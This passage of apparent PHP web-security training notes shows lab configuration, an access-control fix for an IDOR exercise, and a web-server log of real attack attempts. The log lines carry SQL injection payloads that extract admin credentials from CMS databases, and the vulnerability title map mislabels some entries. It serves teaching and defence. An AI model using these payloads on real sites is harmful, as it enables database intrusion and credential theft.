                'id'   => 'sde',
                'name' => 'Sensitive Data Exposure',
                'url'  => 'index.php?action=sde'
            ]
        ],
        'vulnerabilities8'  => [
            [
                'id'   => 'mflac',
                'name' => 'Missing Function ACL',
                'url'  => 'index.php?action=mflac'
            ]
        ],
        'vulnerabilities9'  => [
            [
                'id'   => 'csrf',
                'name' => 'CSRF',
                'url'  => 'index.php?action=csrf'
            ]
        ],
        'vulnerabilities10' => [
            [
                'id'   => 'ucwkv',
                'name' => 'Using Comp Knwn Vuln',
                'url'  => 'index.php?action=ucwkv'
            ]
        ],
        'vulnerabilities11' => [
            [
                'id'   => 'urf',
                'name' => 'Unvalidated Red/Forw',
                'url'  => 'index.php?action=urf'
            ]
        ],
        'vulnerabilities12' => [
            [
                'id'   => 'ci',
                'name' => 'Command Execution',
                'url'  => 'index.php?action=ci'
            ]
        ],
        'vulnerabilities13' => [
            [
                'id'   => 'ufi',
                'name' => 'Unrestricted File Inclusion',
                'url'  => 'index.php?action=ufi'
            ]
        ],
        'vulnerabilities14' => [
            [
                'id'   => 'ifu',
                'name' => 'Insecure File Uploads',
                'url'  => 'index.php?action=ifu'
            ]
        ],
        'vulnerabilities15' => [
            [
                'id'   => 'captcha',
                'name' => 'Insecure CAPTCHA',
                'url'  => 'index.php?action=captcha'
            ]
        ],
        'layout'            => [
            [
                'id'   => 'logout',
                'name' => 'Logout',
                'url'  => 'index.php?action=logout'
            ]
        ]
    ],

    'menuMap' => [
        'home'     => ['method' => 'homeAction',          'params' => NULL ],
        'security' => ['method' => 'securityAction',      'params' => NULL ],
        'phpinfo'  => ['method' => 'phpInfoAction',       'params' => NULL ],
        'logout'   => ['method' => 'logoutAction',        'params' => NULL ],
        'Register' => ['method' => 'vulnerabilityAction', 'params' => 'sde' ],
    ],

    'vulnerabilityTitle' => [
        'brute'   => 'Brute Force',
        'captcha' => 'Insecure CAPTCHA',
        'ci'      => 'Command Injection',
        'csrf'    => 'Cross Site Request Forgery (CSRF)',
        'idor'    => 'Insecure Direct Object References',
        'mflac'   => 'Missing Function Level Access Control',
        'sde'     => 'Sensitive Data Exposure',
        'ufi'     => 'File Inclusion',
        'urf'     => 'Unvalidated Redirects / Forwards',
        'ifu'     => 'Insecure File Inclusion',
        'smc'     => 'Security Misconfiguration',
        'ucwkv'   => 'Insecure File Upload',
        'urf'     => 'Unvalidated Redirects and Forwards',
        'xssr'    => 'Reflected Cross Site Scripting (XSS)',
        'xsss'    => 'Stored Cross Site Scripting (XSS)',
        'sqli'    => 'SQL Injection',
    ],

    //Brute Force Detector
    'bfdetect'        => [
        // Disable PHP-BruteForce-Attack Detector
        // 1 to disable, 0 to enable
        'isDisable' => 0,

        'table'       => 'bfdetect',

        // If 404 requests reach over max_request, notify you
        'maxRequest'  => 4, // per 5 minutes

        // your/your server admin's email address
        'to'          => 'security@securitytraining.com',
        'headers'     => [
            'from'     => 'guarddog@securitytraining.com',
            'X-Mailer' => 'BruceForce Attack Detector',
        ],

        // if attack occurs, mail you / your server admin
        // 0 to no emailing
        'emailNotify' => 1,

        // Log attacks in file, 1 to yes, 0 to no
        'logDir'      => 'log',
        'logAttack'   => 1,

        // Log attacks in system log mechanism or server, 1 to yes, 0 to no
        'logSys'      => 0,

        // if set to 1, sleep the application for several minutes, causing attackers' tools timing out
        // be careful, it may cause DOS to your web server
        'antiAttack'  => 0,
        'sleepTime'   => 5, // minute
    ],
];
```
* Example for the Insecure Direct Object Refs lab using Zend\Permissions\Acl\*
```
<?php
/* This is the code file you need to modify */
// Fix 1: No direct object reference. (Static table for simplicity.)
// This is in effect also a whitelist.
// MD5 (bad!) but NOT of the image name, so cracking it doesn't help the attacker
$resources = [
    'acbd18db4cc2f85cedef654fccc4a4d8' => 'img00011.png',
    '37b51d194a7513e45b56f6524f2d51f2' => 'img00012.png',
];
// Fix 2: Don't show specific errors
$html = "Invalid resource";
// Fix 3: TODO: ACL
use Zend\Permissions\Acl\ {Acl, Role, Resource};

// Missing pieces:
// 1. Verify user identity
// 2. From the verified identity retrieve the user's role
// Assume: if $_GET['user'] == 'admin' == allow access; otherwise deny
$user = $_GET['user'] ?? 'guest';
$user = strip_tags($user);

// normally the user name does NOT correspond to the role!
$acl = new Acl();
$acl->addRole('guest');
$acl->addRole('admin', 'guest');
$acl->addResource('acbd18db4cc2f85cedef654fccc4a4d8');
$acl->addResource('37b51d194a7513e45b56f6524f2d51f2');

// now we make assignments
$acl->allow('guest', 'acbd18db4cc2f85cedef654fccc4a4d8');
$acl->allow('admin', '37b51d194a7513e45b56f6524f2d51f2');

if(isset($_GET['img'])) {
    $resourceID = $_GET['img'];
    if(isset($resources[$resourceID]) && $acl->isAllowed($user, $resourceID)) {
    $image = $resources[$resourceID];
    $html = "<img src='vulnerabilities/idor/source/img/$image'>";
    }

}
```
## ERRATA

## Actual Attacks from Customer Access Log (sanitized)
```
[Sun Jul 21 23:05:10 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/plus, referer: http://second.site.com//plus/ajax_common.php?act=hotword&query=%E9%8C%A6'%20a%3C%3End%201=2%20un%3C%3Eion%20sel%3C%3Eect%201,group_concat(0x23,0x23,0x23,admin_name,0x3a,pwd,0x3a,pwd_hash,0x23,0x23,0x23),3%20fr%3C%3Eom%20qs_admin%23%22
[Sun Jul 21 23:05:11 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/plug, referer: http://second.site.com//plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user
[Sun Jul 21 23:05:11 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/mx_form, referer: http://second.site.com//mx_form
[Sun Jul 21 23:05:11 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/plus, referer: http://second.site.com//plus/recommend.php?aid=1
[Sun Jul 21 23:05:12 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/Images/del.gif
[Sun Jul 21 23:05:12 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/login/login_check.php?met_cookie_filter%5Ba%5D=a%27,admin_pass=md5(1234567)+where+id=1;+%23--
[Sun Jul 21 23:05:12 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/wap, referer: http://second.site.com//wap/?action=show&mod=admin%20where%20userid=1%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(0x23,username,0x23,password,0x23)%20from%20la_admin%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23
[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/news, referer: http://second.site.com//news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(0x23,0x23,0x23,user,0x3a,password,0x23,0x23,0x23)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html
[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/news, referer: http://second.site.com//news/html/?410%27union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(0x23,0x23,0x23,user,0x3a,password,0x23,0x23,0x23)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where%271%27=%271.html
[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/f, referer: http://second.site.com//f/job.php?job=getzone&typeid=zone&fup=../../do%5Cjs&id=514125&webdb%5Bweb_open%5D=1&webdb%5Bcache_time_js%5D=-1&pre=qb_label%20where%20lid=-1%20UNION%20SELECT%201,2,3,4,5,6,0,concat%280x23,username,0x23,password,0x23%29,9,10,11,12,13,14,15,16,17,18,19%20from%20qb_members%20limit%201%23
[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/shopadmin, referer: http://second.site.com//shopadmin/index.php?ctl=passport&act=login&sess_id=1%27+and%28select+1+from%28select+count%28*%29,concat%28%28select+%28select+%28select+concat%28userpass,0x7e,username,0x7e,op_id%29+from+sdb_operators+Order+by+username+limit+0,1%29+%29+from+%60information_schema%60.tables+limit+0,1%29,floor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27=%271
[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/SiteServer, referer: http://second.site.com//SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest
[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/SiteFiles, referer: http://second.site.com//SiteFiles/Module/cms/logo.gif
[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/NewsType.asp, referer: http://second.site.com//NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='
[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/install, referer: http://second.site.com//install/index.php?_m=frontpage&_a=setting&default_tpl=jixie-110118-a16
[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/Data21293, referer: http://second.site.com//Data21293/NYIKUGY5434231.mdb
[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/review.asp?id=1%20union%20select%201,2,3,4,5,admin,7,8,9,password,11%20%20from%20cnhww
[Sun Jul 21 23:05:15 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/left.asp
```
